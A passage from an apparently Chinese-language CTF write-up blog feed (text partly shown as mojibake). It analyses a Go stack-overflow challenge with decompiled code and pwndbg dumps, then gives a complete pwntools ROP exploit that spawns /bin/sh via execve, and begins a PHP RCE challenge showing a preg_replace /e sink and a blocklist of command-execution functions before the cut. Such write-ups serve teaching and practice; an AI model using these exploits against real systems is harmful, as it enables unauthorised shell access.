class="number">3</span>] = <span class="number">0</span>x10000LL;</span><br><span class="line">  fmt_Fprintf(</span><br><span class="line">    (unsigned int)off_4DF508,</span><br><span class="line">    qword_5633E8,</span><br><span class="line">    (unsigned int)<span class="string">&quot;Happy magic golang!\n&quot;</span>,</span><br><span class="line">    <span class="number">20</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    (unsigned int)off_4DF4E8,</span><br><span class="line">    v7);</span><br><span class="line">  v38[<span class="number">0</span>] = &amp;RTYPE_string;</span><br><span class="line">  v38[<span class="number">1</span>] = &amp;off_4DF040;</span><br><span class="line">  v8 = qword_5633E8;</span><br><span class="line">  fmt_Fprintf(</span><br><span class="line">    (unsigned int)off_4DF508,</span><br><span class="line">    qword_5633E8,</span><br><span class="line">    (unsigned int)<span class="string">&quot;%s&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    (unsigned int)v38,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    (unsigned int)&amp;off_4DF040,</span><br><span class="line">    v9);</span><br><span class="line">  bufio__ptr_Scanner_Scan((unsigned int)v42, v8, v10, <span class="number">2</span>, (unsigned int)v38, v11, v12, v13, v14);</span><br><span class="line">  v15 = v43;</span><br><span class="line">  v35 = (unsigned __int8 *)runtime_slicebytetostring(<span class="number">0</span>, v43, v44, <span class="number">2</span>, (unsigned int)v38, v16, v17, v18, v19, v31);</span><br><span class="line">  v36 = v15;</span><br><span class="line">  v24 = v39;</span><br><span class="line">  v25 = v35;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>LL; v15 &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = *v25;</span><br><span class="line">    *v24++ = v20;</span><br><span class="line">    ++v25;</span><br><span class="line">  &#125;</span><br><span class="line">  v37 = v3;</span><br><span class="line">  v27 = runtime_convTstring((_DWORD)v35, v36, v20, <span class="number">2</span>, (unsigned int)v38, v21, v22, (_DWORD)v25, v23, v32);</span><br><span class="line">  *(_QWORD *)&amp;v37 = &amp;RTYPE_string;</span><br><span class="line">  *((_QWORD *)&amp;v37 + <span class="number">1</span>) = v27;</span><br><span class="line">  fmt_Fprintf(</span><br><span class="line">    (unsigned int)off_4DF508,</span><br><span class="line">    qword_5633E8,</span><br><span class="line">    (unsigned int)<span class="string">&quot;Your magic message :%s\n\&quot;</span>, missing CPU supp<span class="string">&quot;,</span></span><br><span class="line"><span class="string">    23,</span></span><br><span class="line"><span class="string">    (unsigned int)&amp;v37,</span></span><br><span class="line"><span class="string">    1,</span></span><br><span class="line"><span class="string">    1,</span></span><br><span class="line"><span class="string">    v28,</span></span><br><span class="line"><span class="string">    v29);</span></span><br><span class="line"><span class="string">  return 0LL;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>ä½œä¸ºä¸€ä¸ªæ–°äººï¼Œæˆ‘æ•¢ä¿è¯æˆ‘çœ¼ç›çœ‹çäº†ä¹Ÿçœ‹ä¸æ‡‚è¿™ç©æ„å„¿ï¼Œå› æ­¤ï¼Œå…ˆ gdb ä¸€ä¸‹å†è¯´ï¼Œåœ¨é‚£ä¹‹å‰ï¼Œå…ˆä¸‹æ–­ç‚¹ï¼Œ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004</span>A0974                 movups  [<span class="type">rsp</span>+<span class="number">208</span><span class="type">h</span>+<span class="type">var_B0</span>], xmm15</span><br><span class="line">.text:<span class="number">00000000004</span>A097D                 lea     rdx, RTYPE_string</span><br><span class="line">.text:<span class="number">00000000004</span>A0984                 mov     qword ptr [<span class="type">rsp</span>+<span class="number">208</span><span class="type">h</span>+<span class="type">var_B0</span>], rdx</span><br><span class="line">.text:<span class="number">00000000004</span>A098C                 lea     r10, off_4DF040 ; <span class="string">&quot;Input your magic message :\nSIG&quot;</span></span><br><span class="line">.text:<span class="number">00000000004</span>A0993                 mov     qword ptr [<span class="type">rsp</span>+<span class="number">208</span><span class="type">h</span>+<span class="type">var_B0</span>+<span class="number">8</span>], r10</span><br><span class="line">.text:<span class="number">00000000004</span>A099B                 mov     rbx, cs:qword_5633E8</span><br><span class="line">.text:<span class="number">00000000004</span>A09A2                 lea     rax, off_4DF508</span><br><span class="line">.text:<span class="number">00000000004</span>A09A9                 lea     rcx, aS_2       ; <span class="string">&quot;%s&quot;</span></span><br><span class="line">.text:<span class="number">00000000004</span>A09B0                 mov     edi, <span class="number">2</span></span><br><span class="line">.text:<span class="number">00000000004</span>A09B5                 lea     rsi, [<span class="type">rsp</span>+<span class="number">208</span><span class="type">h</span>+<span class="type">var_B0</span>]</span><br><span class="line">.text:<span class="number">00000000004</span>A09BD                 mov     r8d, <span class="number">1</span></span><br><span class="line">.text:<span class="number">00000000004</span>A09C3                 mov     r9, r8</span><br><span class="line">.text:<span class="number">00000000004</span>A09C6                 call    fmt_Fprintf</span><br><span class="line">.text:<span class="number">00000000004</span>A09CB                 lea     rax, [<span class="type">rsp</span>+<span class="number">208</span><span class="type">h</span>+<span class="type">var_88</span>]</span><br><span class="line">.text:<span class="number">00000000004</span>A09D3                 call    bufio__ptr_Scanner_Scan</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ‰¾åˆ°äº†éœ€è¦ä¸‹æ–­ç‚¹çš„å¤§æ¦‚çš„åœ°å€ï¼Œå°±æ˜¯æœ€åè¿™ä¸€è¡Œçš„è¿™é‡Œæ˜¯è¾“å…¥çš„å‡½æ•°ï¼Œä¸‹æ–­ç‚¹ä¹‹åï¼Œå†ç»§ç»­è¿›è¡Œè°ƒè¯•ï¼Œä¹‹åå°±å‘ç°äº†ä¸€ç‚¹å¥‡æ€ªçš„ä¸œè¥¿ï¼Œå°±æ˜¯è¿™å„¿ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚<span class="literal">-1f8</span> <span class="number">0</span>xc000044d68 â€”â–¸ <span class="number">0</span>xc0000b2000 â—‚â€” <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&#x27;</span></span><br></pre></td></tr></table></figure><p>æ ˆçš„ä¸Šä¸‹éƒ½æ²¡æœ‰å†™å…¥çš„ AAAâ€¦ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®åˆå«æ ˆæº¢å‡ºï¼Œå°±å¾ˆè€äººå¯»å‘³æ˜¯ä¸ºå•¥ï¼Œä¸è¿‡ï¼Œæ‡’å¾—è€ƒè™‘é‚£ä¹ˆå¤šäº†ï¼Œå†ç»§ç»­ gdb èµ°èµ·ï¼Œä¹‹åå°±å‘ç°äº†ï¼ŒAAA è¢«é€æ¸é€æ¸åœ°å†™å…¥åˆ°äº†æ ˆä¸Šï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp   <span class="number">0</span>xc000049d60 â—‚â€” <span class="number">0</span>x0</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚<span class="literal">-1f8</span>   <span class="number">0</span>xc000049d68 â€”â–¸ <span class="number">0</span>xc000102000 â—‚â€” <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚<span class="literal">-1f0</span>   <span class="number">0</span>xc000049d70 â—‚â€” <span class="number">0</span>x24 /* <span class="string">&#x27;$&#x27;</span> */</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚<span class="literal">-1e8</span>   <span class="number">0</span>xc000049d78 â—‚â€” <span class="number">0</span>x2</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚<span class="literal">-1e0</span>   <span class="number">0</span>xc000049d80 â€”â–¸ <span class="number">0</span>xc000049eb8 â€”â–¸ <span class="number">0</span>x4aa800 â—‚â€” <span class="number">0</span>x10</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚<span class="literal">-1d8</span>   <span class="number">0</span>xc000049d88 â—‚â€” <span class="number">0</span>x1</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚<span class="literal">-1d0</span>   <span class="number">0</span>xc000049d90 â—‚â€” <span class="number">0</span>x1</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚ rdx<span class="literal">-7</span> <span class="number">0</span>xc000049d98 â—‚â€” <span class="number">0</span>x61616161616161 /* <span class="string">&#x27;aaaaaaa&#x27;</span> */ &lt;<span class="literal">----</span>è¿™é‡Œå¯ä»¥çœ‹åˆ°è¢«å†™å…¥äº†æ ˆä¸Š</span><br></pre></td></tr></table></figure><p>ç„¶åæŸ¥çœ‹æ ˆç©ºé—´çš„å¸ƒå±€ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚ rdx<span class="literal">-7</span> <span class="number">0</span>xc000049d98 â—‚â€” <span class="number">0</span>x61616161616161 /* <span class="string">&#x27;aaaaaaa&#x27;</span> */</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>â”‚<span class="literal">-1c0</span>   <span class="number">0</span>xc000049da0 â—‚â€” <span class="number">0</span>x0</span><br><span class="line">... â†“          <span class="number">30</span> skipped</span><br><span class="line"><span class="number">27</span>:<span class="number">0138</span>â”‚<span class="literal">-0c8</span>   <span class="number">0</span>xc000049e98 â€”â–¸ <span class="number">0</span>xc000020090 â—‚â€” <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>â”‚<span class="literal">-0c0</span>   <span class="number">0</span>xc000049ea0 â—‚â€” <span class="number">0</span>x24 /* <span class="string">&#x27;$&#x27;</span> */</span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>â”‚<span class="literal">-0b8</span>   <span class="number">0</span>xc000049ea8 â€”â–¸ <span class="number">0</span>x49136a â—‚â€” mov <span class="built_in">rbp</span>, qword ptr [<span class="type">rsp</span> + <span class="number">0</span><span class="type">x18</span>]</span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>â”‚<span class="literal">-0b0</span>   <span class="number">0</span>xc000049eb0 â€”â–¸ <span class="number">0</span>x549e80 (data_start+<span class="number">3296</span>) â€”â–¸ <span class="number">0</span>xc000100000 â€”â–¸ <span class="number">0</span>x4b9640 â—‚â€” <span class="number">0</span>x8</span><br><span class="line"><span class="number">2</span>b:<span class="number">0158</span>â”‚<span class="literal">-0a8</span>   <span class="number">0</span>xc000049eb8 â€”â–¸ <span class="number">0</span>x4aa800 â—‚â€” <span class="number">0</span>x10</span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>â”‚<span class="literal">-0a0</span>   <span class="number">0</span>xc000049ec0 â€”â–¸ <span class="number">0</span>x4df040 â€”â–¸ <span class="number">0</span>x4c15af â—‚â€” <span class="number">0</span>x6f79207475706e49 (<span class="string">&#x27;Input yo&#x27;</span>)</span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>â”‚<span class="literal">-098</span>   <span class="number">0</span>xc000049ec8 â€”â–¸ <span class="number">0</span>xc000049d98 â—‚â€” <span class="number">0</span>x61616161616161 /* <span class="string">&#x27;aaaaaaa&#x27;</span> */</span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>â”‚<span class="literal">-090</span>   <span class="number">0</span>xc000049ed0 â—‚â€” <span class="number">0</span>x100</span><br><span class="line"><span class="number">2</span>f:<span class="number">0178</span>â”‚<span class="literal">-088</span>   <span class="number">0</span>xc000049ed8 â—‚â€” <span class="number">0</span>x100</span><br><span class="line"><span class="number">30</span>:<span class="number">0180</span>â”‚<span class="literal">-080</span>   <span class="number">0</span>xc000049ee0 â€”â–¸ <span class="number">0</span>x4df4e8 â€”â–¸ <span class="number">0</span>x4aeb40 â—‚â€” <span class="number">0</span>x10</span><br><span class="line"><span class="number">31</span>:<span class="number">0188</span>â”‚<span class="literal">-078</span>   <span class="number">0</span>xc000049ee8 â€”â–¸ <span class="number">0</span>xc000010010 â€”â–¸ <span class="number">0</span>xc00007e000 â—‚â€” <span class="number">0</span>x0</span><br><span class="line"><span class="number">32</span>:<span class="number">0190</span>â”‚<span class="literal">-070</span>   <span class="number">0</span>xc000049ef0 â€”â–¸ <span class="number">0</span>x4c5dd0 â€”â–¸ <span class="number">0</span>x49b080 â—‚â€” cmp rsp, qword ptr [<span class="type">r14</span> + <span class="number">0</span><span class="type">x10</span>]</span><br><span class="line"><span class="number">33</span>:<span class="number">0198</span>â”‚<span class="literal">-068</span>   <span class="number">0</span>xc000049ef8 â—‚â€” <span class="number">0</span>x10000</span><br><span class="line"><span class="number">34</span>:<span class="number">01</span>a0â”‚<span class="literal">-060</span>   <span class="number">0</span>xc000049f00 â€”â–¸ <span class="number">0</span>xc000102000 â—‚â€” <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span></span><br><span class="line"><span class="number">35</span>:<span class="number">01</span>a8â”‚<span class="literal">-058</span>   <span class="number">0</span>xc000049f08 â—‚â€” <span class="number">0</span>x24 /* <span class="string">&#x27;$&#x27;</span> */</span><br><span class="line"><span class="number">36</span>:<span class="number">01</span>b0â”‚<span class="literal">-050</span>   <span class="number">0</span>xc000049f10 â—‚â€” <span class="number">0</span>x1000</span><br><span class="line"><span class="number">37</span>:<span class="number">01</span>b8â”‚<span class="literal">-048</span>   <span class="number">0</span>xc000049f18 â€”â–¸ <span class="number">0</span>xc000102000 â—‚â€” <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span></span><br><span class="line"><span class="number">38</span>:<span class="number">01</span>c0â”‚<span class="literal">-040</span>   <span class="number">0</span>xc000049f20 â—‚â€” <span class="number">0</span>x1000</span><br><span class="line"><span class="number">39</span>:<span class="number">01</span>c8â”‚<span class="literal">-038</span>   <span class="number">0</span>xc000049f28 â—‚â€” <span class="number">0</span>x1000</span><br><span class="line"><span class="number">3</span>a:<span class="number">01</span>d0â”‚<span class="literal">-030</span>   <span class="number">0</span>xc000049f30 â—‚â€” <span class="number">0</span>x25 /* <span class="string">&#x27;%&#x27;</span> */</span><br><span class="line"><span class="number">3</span>b:<span class="number">01</span>d8â”‚<span class="literal">-028</span>   <span class="number">0</span>xc000049f38 â—‚â€” <span class="number">0</span>x25 /* <span class="string">&#x27;%&#x27;</span> */</span><br><span class="line"><span class="number">3</span>c:<span class="number">01</span>e0â”‚<span class="literal">-020</span>   <span class="number">0</span>xc000049f40 â—‚â€” <span class="number">0</span>x0</span><br><span class="line">... â†“          <span class="number">2</span> skipped</span><br><span class="line"><span class="number">3</span>f:<span class="number">01</span>f8â”‚<span class="literal">-008</span>   <span class="number">0</span>xc000049f58 â—‚â€” <span class="number">0</span>x1</span><br><span class="line"><span class="number">40</span>:<span class="number">0200</span>â”‚ <span class="built_in">rbp</span>   <span class="number">0</span>xc000049f60 â€”â–¸ <span class="number">0</span>xc000049f70 â€”â–¸ <span class="number">0</span>xc000049fd0 â—‚â€” <span class="number">0</span>x0</span><br></pre></td></tr></table></figure><p>èƒ½æ¸…æ™°åœ°çœ‹åˆ°ï¼Œrbp ä¸ç¼“å†²åŒºçš„å¤§å°ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0</span>xf60 <span class="number">0</span>xd98</span><br><span class="line"><span class="number">0</span>xf60-&gt;<span class="number">0</span>xd98 is <span class="literal">-0x1c8</span> bytes (<span class="literal">-0x39</span> words)</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆï¼Œä¹‹åå°±å¯ä»¥ç›´æ¥è¿›è¡Œæ ˆæº¢å‡ºäº†ã€‚ä½†æ˜¯ï¼Œåœ¨ç»è¿‡å¤šæ¬¡æº¢å‡ºä¹‹åï¼Œå‘ç°äº†ä¸ªè‡´å‘½çš„é—®é¢˜ï¼Œå°±æ˜¯å…³äºè¿™ä¸ªè¾“å…¥å‡½æ•°ï¼Œè‡´å‘½åœ¨å“ªé‡Œå‘¢ï¼Ÿåœ¨è¿™å„¿ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000049</span>A786                 cmp     byte ptr [<span class="type">rax</span>+<span class="number">79</span><span class="type">h</span>], <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000049</span>A78A                 jnz     short loc_49A79A</span><br></pre></td></tr></table></figure><p>ä»¥åŠï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000049</span>A79A loc_49A79A:                             ; CODE XREF: bufio__ptr_Scanner_Scan+<span class="number">2</span>Aâ†‘j</span><br><span class="line">.text:<span class="number">000000000049</span>A79A                 xor     eax, eax</span><br><span class="line">.text:<span class="number">000000000049</span>A79C                 mov     <span class="built_in">rbp</span>, [<span class="type">rsp</span>+<span class="number">0</span><span class="type">D0h</span>+<span class="type">var_8</span>]</span><br><span class="line">.text:<span class="number">000000000049</span>A7A4                 add     rsp, <span class="number">0</span>D0<span class="built_in">h</span></span><br><span class="line">.text:<span class="number">000000000049</span>A7AB                 retn</span><br></pre></td></tr></table></figure><p>å®ƒä¼šå¯¹è¿™å„¿è¿›è¡Œä¸€æ¬¡æ¯”å¯¹ï¼Œå¦‚æœæ˜¯ 0ï¼Œåˆ™ä¸ä¼šè·³è½¬ï¼Œå¦‚æœä¸æ˜¯ 0ï¼Œåˆ™ä¼šè·³è½¬ï¼Œç›´æ¥åœæ­¢è¾“å…¥çš„å‡½æ•°ã€‚<br>æ‰€ä»¥éœ€è¦ç›´æ¥ç”¨ \x00 æ¥å¡«å……æ˜¯æœ€ä¿é™©çš„ã€‚ä¹‹åå°±æ˜¯ syscall æ¥æ‰“ï¼Œä½†æ˜¯ exp æˆ‘ä¸æ˜¯å¾ˆä¼šå†™ï¼Œå…ˆå€Ÿé‰´å€Ÿé‰´å¤§ä½¬ä»¬çš„ï¼Œä¹‹åå†çœ‹çœ‹ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = <span class="keyword">process</span>(<span class="string">&#x27;./gostack&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;8.147.133.63&#x27;,  34196)</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(b<span class="string">&#x27;magic message :&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0</span>x000000000563C50</span><br><span class="line">syscall_addr = <span class="number">0</span>x0000000000404043</span><br><span class="line">pop_rsi = <span class="number">0</span>x000000000042138a</span><br><span class="line">pop_rax = <span class="number">0</span>x000000000040f984</span><br><span class="line">pop_rdx = <span class="number">0</span>x00000000004944ec</span><br><span class="line">pop_rdi = <span class="number">0</span>x00000000004a18a5</span><br><span class="line">leave_ret = <span class="number">0</span>x000000000049695a</span><br><span class="line"></span><br><span class="line"><span class="comment"># write &#x27;/bin/sh\x00&#x27; to bss</span></span><br><span class="line">rop = p64(pop_rax)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rsi)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(pop_rdx)</span><br><span class="line">rop += p64(<span class="number">8</span>)</span><br><span class="line">rop += p64(pop_rdi)</span><br><span class="line">rop += p64(<span class="number">0</span>) </span><br><span class="line">rop += p64(syscall_addr)</span><br><span class="line">rop += p64(syscall_addr)</span><br><span class="line">rop += p64(syscall_addr)</span><br><span class="line">rop += p64(syscall_addr)</span><br><span class="line">rop += p64(syscall_addr)</span><br><span class="line">rop += p64(syscall_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">rop += p64(pop_rax)</span><br><span class="line">rop += p64(<span class="number">0</span>x3b)</span><br><span class="line">rop += p64(pop_rsi)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rdx)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rdi)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(syscall_addr)</span><br><span class="line">rop += p64(syscall_addr)</span><br><span class="line">rop += p64(syscall_addr)</span><br><span class="line">rop += p64(syscall_addr)</span><br><span class="line">rop += p64(syscall_addr)</span><br><span class="line">rop += p64(syscall_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;/bin/sh\x00&#x27;</span> + b<span class="string">&#x27;A&#x27;</span> * <span class="number">0</span>xf8</span><br><span class="line">payload += p64(<span class="number">0</span>xc00004dd98)</span><br><span class="line">payload += p64(<span class="number">0</span>x110)</span><br><span class="line">payload += p64(<span class="number">0</span>x110)</span><br><span class="line">payload += b<span class="string">&#x27;D&#x27;</span> * <span class="number">0</span>x60 + b<span class="string">&#x27;E&#x27;</span> * <span class="number">0</span>x50 + b<span class="string">&#x27;F&#x27;</span> *<span class="number">8</span> + rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, gdbscript=&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># b *0x0000000004A0A88</span></span><br><span class="line"><span class="comment"># c</span></span><br><span class="line"><span class="comment"># stack 60</span></span><br><span class="line"><span class="comment">#     &#x27;&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="built_in">sleep</span>(<span class="number">0.6</span>)</span><br><span class="line">io.sendline(b<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">sleep</span>(<span class="number">0.6</span>)</span><br><span class="line">io.sendline(b<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Crypto</h2><h3 id="å¤å¯†"><a class="markdownIt-Anchor" href="#å¤å¯†">#</a> å¤å¯†</h3><p><img data-src="https://img-blog.csdnimg.cn/img_convert/b613dd50168ba85408ec13bb18e31088.png" alt="image.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/f08d9bb9ada5a3e235f039b29aca61af.png" alt="image.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/39b72b7f9a576909c5c70e045b06bf68.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTFerçš„æ¯”èµ›ä¹‹è·¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€2024ã€‘H&amp;NCTF</title>
      <link href="/posts/955175a5.html"/>
      <url>/posts/955175a5.html</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Web</h1><h2 id="please_rce_me"><a class="markdownIt-Anchor" href="#please_rce_me">#</a> Please_RCE_Me</h2><p><img data-src="https://img-blog.csdnimg.cn/img_convert/32f566d418dc4544b9e20d8d13411b66.png" alt="Screenshot 2024-05-12 131227.png"></p><pre><code>GETä¼ å‚è¾“å…¥?moran=flagï¼Œä¹‹åè·å–æºç ï¼š</code></pre><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span 